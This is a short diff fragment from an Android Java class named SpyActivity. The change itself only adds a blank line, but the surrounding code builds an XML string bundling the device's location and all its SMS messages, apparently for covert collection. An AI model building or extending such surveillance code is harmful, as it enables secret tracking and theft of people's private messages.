@@ -166,6 +166,7 @@ public class SpyActivity extends Activity {
 				+localisationXML				// <localisation>
 				+"<ALLSMS>"+getSMSXML+"</ALLSMS>"
 				+"</ALL>";
+		
 		return res;
 	}
 	
